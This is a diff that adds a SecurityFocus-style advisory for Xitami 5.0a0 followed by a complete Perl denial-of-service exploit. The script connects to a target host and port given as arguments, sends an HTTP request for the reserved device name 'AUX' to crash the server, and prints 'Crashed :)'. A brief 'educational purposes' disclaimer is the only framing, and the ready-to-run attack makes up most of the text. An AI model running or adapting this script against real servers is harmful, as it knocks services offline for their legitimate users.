@@ -1,0 +1,78 @@
+source: http://www.securityfocus.com/bid/40027/info
+
+Xitami is prone to a denial-of-service vulnerability.
+
+Attackers can exploit this issue to crash the affected application, denying service to legitimate users.
+
+Xitami 5.0a0 is vulnerable. 
+
+#!/usr/bin/perl
+# Xitami/5.0a0 Denial Of Service
+# Disclaimer:
+# [This code is for Educational Purposes , I would Not be responsible for any misuse of this code]
+# Author: Usman Saeed
+# Company: Xc0re Security Research Group
+# Website: http://www.xc0re.net
+# DATE: [10/05/10]
+
+$host = $ARGV[0];
+$PORT = $ARGV[1];
+
+$packet = "AUX"; 
+
+
+$stuff = "GET /".$packet." HTTP/1.0\r\n\r\n";
+
+
+
+use IO::Socket::INET;
+if (! defined $ARGV[0])
+{
+print "+========================================================+\n";
+print "+ Program [Xitami/5.0a0 Denial Of Service]               +\n";
+print "+ Author [Usman Saeed]                                   +\n";
+print "+ Company [Xc0re Security Research Group]                +\n";
+print "+ DATE: [10/05/10]                                       +\n";
+print "+ Usage :perl sploit.pl webserversip wbsvrport           +\n";
+print "+ Disclaimer: [This code is for Educational Purposes ,   +\n";
+print "+ I would Not be responsible for any misuse of this code]+\n";
+print "+========================================================+\n";
+
+
+
+
+
+exit;
+}
+
+
+$sock = IO::Socket::INET->new( Proto => "tcp",PeerAddr  => $host , PeerPort  => $PORT) || die "Cant connect to $host!";
+print "+========================================================+\n";
+print "+ Program [Xitami/5.0a0 Denial Of Service]               +\n";
+print "+ Author [Usman Saeed]                                   +\n";
+print "+ Company [Xc0re Security Research Group]                +\n";
+print "+ DATE: [10/05/10]                                       +\n";
+print "+ Usage :perl sploit.pl webserversip wbsvrport           +\n";
+print "+ Disclaimer: [This code is for Educational Purposes ,   +\n";
+print "+ I would Not be responsible for any misuse of this code]+\n";
+print "+========================================================+\n";
+
+
+
+
+print "\n";
+
+print "[*] Initializing\n";
+
+sleep(2);
+
+print "[*] Sendin DOS Packet \n";
+
+send ($sock , $stuff , 0);
+print "[*] Crashed :) \n";
+$res = recv($sock,$response,1024,0);
+print $response;
+
+
+
+exit;
